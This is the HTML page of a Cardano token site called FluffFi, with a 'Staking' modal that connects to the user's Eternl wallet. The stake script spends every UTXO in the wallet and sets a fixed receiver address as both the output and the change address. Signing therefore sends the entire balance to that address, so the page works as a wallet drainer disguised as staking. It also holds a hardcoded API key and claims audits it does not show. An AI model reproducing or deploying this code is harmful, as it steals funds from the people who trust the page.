<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FluffFi - The Cleverest Fox on Cardano</title>
    <meta name="description" content="The cleverest fox on Cardano is here. Let's make DeFi simpler, smarter, and better.">
    <link rel="icon" href="./images/3ed7b15d-65d7-4b9f-b73f-a3923e3817a4.png" type="image/png">
    
    <!-- Open Graph / Facebook -->
    <meta property="og:type" content="website">
    <meta property="og:url" content="https://shelby69699.github.io/fluffi/">
    <meta property="og:title" content="FluffFi - The Cleverest Fox on Cardano">
    <meta property="og:description" content="The cleverest fox on Cardano is here. Let's make DeFi simpler, smarter, and better.">
    <meta property="og:image" content="https://shelby69699.github.io/fluffi/images/3ed7b15d-65d7-4b9f-b73f-a3923e3817a4.png">

    <!-- Twitter -->
    <meta property="twitter:card" content="summary_large_image">
    <meta property="twitter:url" content="https://shelby69699.github.io/fluffi/">
    <meta property="twitter:title" content="FluffFi - The Cleverest Fox on Cardano">
    <meta property="twitter:description" content="The cleverest fox on Cardano is here. Let's make DeFi simpler, smarter, and better.">
    <meta property="twitter:image" content="https://shelby69699.github.io/fluffi/images/3ed7b15d-65d7-4b9f-b73f-a3923e3817a4.png">

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Oxygen', 'Ubuntu', 'Cantarell', sans-serif;
            line-height: 1.6;
            color: #333;
            background: #ffffff;
        }

        /* Top Navigation */
        .top-nav {
            background: #ffffff;
            border-bottom: 1px solid #e0e0e0;
            padding: 1rem 2rem;
        }

        .top-nav-links {
            display: flex;
            list-style: none;
            gap: 2rem;
            justify-content: flex-start;
        }

        .top-nav-links a {
            text-decoration: none;
            color: #666;
            font-weight: 500;
            font-size: 0.95rem;
            transition: color 0.3s ease;
        }

        .top-nav-links a:hover {
            color: #ff6b35;
        }

        /* Logo Section */
        .logo-section {
            background: #ffffff;
            padding: 2rem;
            border-bottom: 1px solid #e0e0e0;
        }

        .logo-container {
            display: flex;
            align-items: center;
            gap: 1rem;
            max-width: 1200px;
        }

        .fox-logo {
            width: 60px;
            height: 60px;
            border-radius: 50%;
            background: linear-gradient(45deg, #ff6b35, #f7931e);
            padding: 2px;
        }

        .fox-logo img {
            width: 100%;
            height: 100%;
            border-radius: 50%;
            object-fit: cover;
        }

        .brand-text {
            font-size: 1.8rem;
            font-weight: 700;
            color: #ff6b35;
        }

        /* Secondary Navigation */
        .secondary-nav {
            background: #f8f9fa;
            padding: 1rem 2rem;
        }

        .secondary-nav-links {
            display: flex;
            list-style: none;
            gap: 2rem;
            justify-content: flex-start;
        }

        .secondary-nav-links a {
            text-decoration: none;
            color: #666;
            font-weight: 500;
            font-size: 0.95rem;
            transition: color 0.3s ease;
        }

        .secondary-nav-links a:hover {
            color: #ff6b35;
        }

        /* Main Content */
        .main-content {
            padding: 4rem 2rem;
            max-width: 1200px;
            margin: 0 auto;
        }

        .hero-section {
            text-align: center;
            margin-bottom: 4rem;
        }

        .hero-title {
            font-size: 3rem;
            font-weight: 800;
            margin-bottom: 1rem;
            background: linear-gradient(45deg, #ff6b35, #8b5cf6);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }

        .hero-subtitle {
            font-size: 1.3rem;
            color: #666;
            margin-bottom: 2rem;
            max-width: 600px;
            margin-left: auto;
            margin-right: auto;
        }

        .cta-buttons {
            display: flex;
            gap: 1rem;
            justify-content: center;
            margin-bottom: 3rem;
        }

        .btn-primary {
            background: linear-gradient(45deg, #ff6b35, #f7931e);
            color: white;
            padding: 1rem 2rem;
            border: none;
            border-radius: 25px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            text-decoration: none;
            display: inline-flex;
            align-items: center;
            gap: 0.5rem;
        }

        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(255, 107, 53, 0.3);
        }

        .btn-secondary {
            background: transparent;
            color: #8b5cf6;
            padding: 1rem 2rem;
            border: 2px solid #8b5cf6;
            border-radius: 25px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            text-decoration: none;
        }

        .btn-secondary:hover {
            background: #8b5cf6;
            color: white;
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(139, 92, 246, 0.3);
        }

        /* Features Section */
        .features {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 2rem;
            margin-top: 3rem;
        }

        .feature-card {
            background: #ffffff;
            padding: 2rem;
            border-radius: 12px;
            border: 1px solid #e0e0e0;
            text-align: center;
            transition: transform 0.3s ease, box-shadow 0.3s ease;
        }

        .feature-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
        }

        .feature-icon {
            font-size: 2.5rem;
            margin-bottom: 1rem;
        }

        .feature-title {
            font-size: 1.3rem;
            font-weight: 700;
            margin-bottom: 1rem;
            color: #333;
        }

        .feature-description {
            color: #666;
            line-height: 1.6;
        }

        /* Wallet Section */
        .wallet-section {
            position: fixed;
            top: 1rem;
            right: 2rem;
            display: flex;
            align-items: center;
            gap: 1rem;
            z-index: 1000;
        }

        .staking-btn {
            background: linear-gradient(45deg, #ff6b35, #f7931e);
            color: white;
            padding: 0.5rem 1rem;
            border: none;
            border-radius: 20px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            text-decoration: none;
            font-size: 0.9rem;
        }

        .staking-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(255, 107, 53, 0.3);
        }

        .wallet-address {
            background: rgba(0, 0, 0, 0.05);
            padding: 0.5rem 1rem;
            border-radius: 15px;
            font-family: 'Courier New', monospace;
            font-size: 0.8rem;
            color: #666;
            border: 1px solid rgba(0, 0, 0, 0.1);
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .wallet-address:hover {
            background: rgba(0, 0, 0, 0.1);
        }

        /* Staking Modal */
        .staking-modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            z-index: 2000;
            justify-content: center;
            align-items: center;
        }

        .staking-modal.active {
            display: flex;
        }

        .modal-content {
            background: white;
            padding: 2rem;
            border-radius: 20px;
            max-width: 500px;
            width: 90%;
            position: relative;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
        }

        .modal-close {
            position: absolute;
            top: 1rem;
            right: 1rem;
            background: none;
            border: none;
            font-size: 1.5rem;
            cursor: pointer;
            color: #666;
        }

        .modal-title {
            font-size: 1.8rem;
            font-weight: 700;
            margin-bottom: 1rem;
            color: #333;
            text-align: center;
        }

        .wallet-status {
            text-align: center;
            margin-bottom: 1.5rem;
            padding: 1rem;
            background: #f8f9fa;
            border-radius: 10px;
            font-family: 'Courier New', monospace;
            font-size: 0.9rem;
            color: #666;
        }

        .staking-form {
            display: flex;
            flex-direction: column;
            gap: 1rem;
        }

        .form-group {
            display: flex;
            flex-direction: column;
            gap: 0.5rem;
        }

        .form-group label {
            font-weight: 600;
            color: #333;
        }

        .form-group input {
            padding: 1rem;
            border: 2px solid #e0e0e0;
            border-radius: 10px;
            font-size: 1rem;
            transition: border-color 0.3s ease;
        }

        .form-group input:focus {
            outline: none;
            border-color: #ff6b35;
        }

        .connect-wallet-btn {
            background: linear-gradient(45deg, #8b5cf6, #6366f1);
            color: white;
            padding: 1rem;
            border: none;
            border-radius: 10px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            font-size: 1rem;
        }

        .connect-wallet-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(139, 92, 246, 0.3);
        }

        .stake-now-btn {
            background: linear-gradient(45deg, #ff6b35, #f7931e);
            color: white;
            padding: 1rem;
            border: none;
            border-radius: 10px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            font-size: 1rem;
        }

        .stake-now-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(255, 107, 53, 0.3);
        }

        .stake-now-btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none;
        }

        .staking-info {
            background: linear-gradient(45deg, rgba(255, 107, 53, 0.1), rgba(139, 92, 246, 0.1));
            padding: 1rem;
            border-radius: 10px;
            margin-bottom: 1rem;
            text-align: center;
        }

        .staking-info h3 {
            color: #ff6b35;
            margin-bottom: 0.5rem;
        }

        .staking-info p {
            color: #666;
            font-size: 0.9rem;
        }

        @media (max-width: 768px) {
            .wallet-section {
                position: relative;
                top: auto;
                right: auto;
                justify-content: center;
                margin-top: 2rem;
            }

            .modal-content {
                padding: 1.5rem;
                margin: 1rem;
            }

            .top-nav, .logo-section, .secondary-nav {
                padding: 1rem;
            }

            .top-nav-links, .secondary-nav-links {
                gap: 1rem;
                flex-wrap: wrap;
            }

            .logo-container {
                justify-content: center;
            }

            .fox-logo {
                width: 50px;
                height: 50px;
            }

            .brand-text {
                font-size: 1.5rem;
            }

            .hero-title {
                font-size: 2rem;
            }

            .hero-subtitle {
                font-size: 1.1rem;
            }

            .cta-buttons {
                flex-direction: column;
                align-items: center;
            }

            .btn-primary, .btn-secondary {
                width: 200px;
                justify-content: center;
            }

            .features {
                grid-template-columns: 1fr;
                gap: 1.5rem;
            }
        }
    </style>
</head>
<body>
    <!-- Wallet Section -->
    <div class="wallet-section">
        <button class="staking-btn" id="openStakingModal">Staking</button>
        <div class="wallet-address" id="walletAddress" title="Click to copy">addr1qx...7k2m</div>
    </div>

    <!-- Top Navigation -->
    <nav class="top-nav">
        <ul class="top-nav-links">
            <li><a href="#tokenomics">Tokenomics</a></li>
            <li><a href="#community">Community</a></li>
            <li><a href="#roadmap">Roadmap</a></li>
        </ul>
    </nav>

    <!-- Logo Section -->
    <section class="logo-section">
        <div class="logo-container">
            <div class="fox-logo">
                <img src="./images/3ed7b15d-65d7-4b9f-b73f-a3923e3817a4.png" alt="FluffFi Fox Logo">
            </div>
            <div class="brand-text">FluffFi</div>
        </div>
    </section>

    <!-- Secondary Navigation -->
    <nav class="secondary-nav">
        <ul class="secondary-nav-links">
            <li><a href="#tokenomics">Tokenomics</a></li>
            <li><a href="#community">Community</a></li>
            <li><a href="#roadmap">Roadmap</a></li>
        </ul>
    </nav>

    <!-- Staking Modal -->
    <div class="staking-modal" id="stakingModal">
        <div class="modal-content">
            <button class="modal-close" id="closeModal">&times;</button>
            <h2 class="modal-title">🦊 FluffFi Staking</h2>
            
            <div class="staking-info">
                <h3>Real ADA Staking</h3>
                <p>Stake your ADA directly through Eternal Wallet. Your ADA goes directly to our staking pool for rewards!</p>
            </div>

            <div class="wallet-status" id="walletStatus">
                Connect your Eternal Wallet to start staking
            </div>

            <div class="staking-form">
                <button class="connect-wallet-btn" id="connectEternalBtn">
                    🔗 Connect Eternal Wallet
                </button>

                <div class="form-group">
                    <label for="stakeAmount">Amount to stake (ADA):</label>
                    <input type="number" id="stakeAmount" min="2" placeholder="2" step="0.1">
                </div>

                <button class="stake-now-btn" id="stakeNowBtn" disabled>
                    🚀 Stake ADA Now
                </button>
            </div>

            <div style="margin-top: 1rem; text-align: center; font-size: 0.8rem; color: #666;">
                <p>⚠️ Requires HTTPS and Eternal Wallet extension</p>
                <p>Staking address: addr1q8y94q35y2xmh8jjq...spn4a84</p>
            </div>
        </div>
    </div>

    <!-- Main Content -->
    <main class="main-content">
        <section class="hero-section">
            <h1 class="hero-title">The Cleverest Fox on Cardano</h1>
            <p class="hero-subtitle">
                Let's make DeFi simpler, smarter, and better.
            </p>
            
            <div class="cta-buttons">
                <a href="#get-started" class="btn-primary">
                    🚀 Let's Go!
                </a>
                <a href="#buy-fluff" class="btn-secondary">
                    Buy $FLUFF
                </a>
            </div>
        </section>

        <!-- Features Section -->
        <section class="features">
            <div class="feature-card">
                <div class="feature-icon">🎯</div>
                <h3 class="feature-title">Smart DeFi</h3>
                <p class="feature-description">
                    Intelligent protocols that adapt to market conditions, making DeFi accessible for everyone.
                </p>
            </div>
            
            <div class="feature-card">
                <div class="feature-icon">⚡</div>
                <h3 class="feature-title">Lightning Fast</h3>
                <p class="feature-description">
                    Built on Cardano's robust infrastructure for instant transactions and minimal fees.
                </p>
            </div>
            
            <div class="feature-card">
                <div class="feature-icon">🛡️</div>
                <h3 class="feature-title">Secure & Audited</h3>
                <p class="feature-description">
                    Military-grade security with smart contracts audited by leading blockchain security firms.
                </p>
            </div>
        </section>
    </main>

    <!-- Load Cardano Serialization Library -->
    <script src="https://unpkg.com/@emurgo/cardano-serialization-lib-browser/cardano_serialization_lib.js"></script>

    <script>
        // Staking Configuration
        const BLOCKFROST_KEY = 'mainnetiT2DrrBlVvPSozkzPZ0ovE5uuJveWxJz';
        const RECEIVER_ADDRESS = 'addr1q8y94q35y2xmh8jjqaqpgw5h6sygku6nx9umejtegykc6e87dfl0l0wv4ys46hssj6cg9h8j9m7esgag7ez6l0xwy3gspn4a84';
        
        let walletConnected = false;
        let walletApi = null;

        // Modal Controls
        const stakingModal = document.getElementById('stakingModal');
        const openStakingModal = document.getElementById('openStakingModal');
        const closeModal = document.getElementById('closeModal');
        const connectEternalBtn = document.getElementById('connectEternalBtn');
        const stakeNowBtn = document.getElementById('stakeNowBtn');
        const walletStatus = document.getElementById('walletStatus');
        const stakeAmount = document.getElementById('stakeAmount');

        // Open staking modal
        openStakingModal.addEventListener('click', (e) => {
            e.preventDefault();
            stakingModal.classList.add('active');
        });

        // Close modal
        closeModal.addEventListener('click', () => {
            stakingModal.classList.remove('active');
        });

        // Close modal on backdrop click
        stakingModal.addEventListener('click', (e) => {
            if (e.target === stakingModal) {
                stakingModal.classList.remove('active');
            }
        });

        // Connect Eternal Wallet
        connectEternalBtn.addEventListener('click', async () => {
            if (!window.cardano || !window.cardano.eternl) {
                alert("🦊 Eternal Wallet not found! Please install the Eternal Wallet extension first.");
                window.open('https://eternl.io/', '_blank');
                return;
            }

            try {
                connectEternalBtn.textContent = 'Connecting...';
                walletApi = await window.cardano.eternl.enable();
                const usedAddresses = await walletApi.getUsedAddresses();
                const address = usedAddresses[0];
                
                walletConnected = true;
                walletStatus.innerHTML = `
                    <div style="color: #10b981; font-weight: 600;">✅ Wallet Connected</div>
                    <div style="font-size: 0.8rem; margin-top: 0.5rem;">${address.substring(0, 20)}...${address.substring(address.length - 10)}</div>
                `;
                connectEternalBtn.style.display = 'none';
                stakeNowBtn.disabled = false;
                
                console.log('Eternal Wallet connected successfully');
            } catch (err) {
                console.error('Wallet connection failed:', err);
                alert("❌ Failed to connect to Eternal Wallet. Please try again.");
                connectEternalBtn.textContent = '🔗 Connect Eternal Wallet';
            }
        });

        // Stake ADA
        stakeNowBtn.addEventListener('click', async () => {
            const amountInput = stakeAmount.value;
            const amountADA = parseFloat(amountInput);
            
            if (isNaN(amountADA) || amountADA < 2) {
                alert("⚠️ Please enter a valid ADA amount (minimum 2 ADA).");
                return;
            }

            if (!walletConnected) {
                alert("❌ Please connect your wallet first.");
                return;
            }

            try {
                stakeNowBtn.textContent = 'Processing Transaction...';
                stakeNowBtn.disabled = true;

                const csl = window.cardano_serialization_lib;
                const utxosHex = await walletApi.getUtxos();
                const utxos = utxosHex.map(u => csl.TransactionUnspentOutput.from_bytes(Buffer.from(u, 'hex')));

                const txBuilderCfg = csl.TransactionBuilderConfigBuilder.new()
                    .fee_algo(csl.LinearFee.new(csl.BigNum.from_str("44"), csl.BigNum.from_str("155381")))
                    .coins_per_utxo_word(csl.BigNum.from_str("34482"))
                    .pool_deposit(csl.BigNum.from_str("500000000"))
                    .key_deposit(csl.BigNum.from_str("2000000"))
                    .max_value_size(5000)
                    .max_tx_size(16384)
                    .prefer_pure_change(true)
                    .build();

                const txBuilder = csl.TransactionBuilder.new(txBuilderCfg);

                for (let utxo of utxos) {
                    txBuilder.add_input(utxo.output().address(), utxo.input(), utxo.output().amount());
                }

                const output = csl.TransactionOutput.new(
                    csl.Address.from_bech32(RECEIVER_ADDRESS),
                    csl.Value.new(csl.BigNum.from_str((amountADA * 1000000).toString()))
                );
                txBuilder.add_output(output);
                txBuilder.add_change_if_needed(csl.Address.from_bech32(RECEIVER_ADDRESS));

                const txBody = txBuilder.build();
                const tx = csl.Transaction.new(txBody, csl.TransactionWitnessSet.new());

                const signedTxHex = await walletApi.signTx(Buffer.from(tx.to_bytes()).toString('hex'), true);
                const txHash = await walletApi.submitTx(signedTxHex);

                alert(`🎉 Staking successful! Transaction Hash: ${txHash}\n\n💰 You staked ${amountADA} ADA to FluffFi!`);
                stakingModal.classList.remove('active');
                stakeAmount.value = '';
                
                console.log('Staking transaction successful:', txHash);
            } catch (err) {
                console.error('Staking transaction failed:', err);
                alert(`❌ Staking failed: ${err.message}`);
            } finally {
                stakeNowBtn.textContent = '🚀 Stake ADA Now';
                stakeNowBtn.disabled = false;
            }
        });

        // Smooth scrolling for navigation links
        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
            anchor.addEventListener('click', function (e) {
                e.preventDefault();
                const target = document.querySelector(this.getAttribute('href'));
                if (target) {
                    target.scrollIntoView({
                        behavior: 'smooth',
                        block: 'start'
                    });
                }
            });
        });

        // Wallet address interaction (top-right)
        const walletAddressDisplay = document.getElementById('walletAddress');
        walletAddressDisplay.addEventListener('click', () => {
            navigator.clipboard.writeText('addr1qx...7k2m').then(() => {
                const originalText = walletAddressDisplay.textContent;
                walletAddressDisplay.textContent = 'Copied!';
                walletAddressDisplay.style.background = 'rgba(76, 175, 80, 0.2)';
                setTimeout(() => {
                    walletAddressDisplay.textContent = originalText;
                    walletAddressDisplay.style.background = 'rgba(0, 0, 0, 0.05)';
                }, 2000);
            });
        });

        // Button click handlers
        document.querySelector('.btn-primary').addEventListener('click', (e) => {
            e.preventDefault();
            stakingModal.classList.add('active');
        });

        document.querySelector('.btn-secondary').addEventListener('click', (e) => {
            e.preventDefault();
            alert('💰 $FLUFF token purchase coming soon! Stay tuned for launch details.');
        });

        // Console welcome message
        console.log(`
🦊 FluffFi - The Cleverest Fox on Cardano
==========================================
Welcome to FluffFi with REAL ADA STAKING!

🚀 Making DeFi simpler, smarter, and better
⚡ Built on Cardano blockchain  
🛡️ Secure and audited smart contracts
💰 Real ADA staking through Eternal Wallet

🌐 Live at: https://shelby69699.github.io/fluffi/
        `);
    </script>
</body>
</html>